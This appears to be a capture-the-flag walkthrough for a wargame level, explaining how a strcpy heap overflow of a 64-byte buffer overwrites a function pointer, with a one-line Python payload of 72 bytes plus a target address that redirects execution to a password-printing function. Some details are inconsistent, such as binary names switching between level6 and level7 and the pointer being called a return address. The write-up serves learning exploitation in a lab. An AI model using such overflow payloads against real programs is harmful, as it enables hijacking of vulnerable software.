# Level6 Walkthrough

## Analyzing the Program with GDB

1. **Disassemble the program functions**:
   Using the command `disas`, we found that the program uses several functions :
   - m : printing ("Nope")
   - n : printing password directly
   - main : alloue 64 bytes + 4 bytes, the strcpy function copy argv[1] and if the string is longer than 64 characters, it can overwrite the content of the function pointer.
   
   - We'll have to overwrite the function pointer to point into n instead of m.

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
   ./level7 
   ```
    The program segfault without any arg but with 

    ```bash
    ./level7 blablabla
    Nope
    ```

2. **Trying to overflow the RET value**

    the idea here is to overwrite the function pointer to point to n function, so we'll have to overflow it in the return address of n. 

    64 + 8 bytes from malloc

    ```bash
    ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
    ```

## Moving to level7

1. **Swith User to level6**:
    Run ```su level7```

2. **Authenticate with the Password**:
    We used the password we found.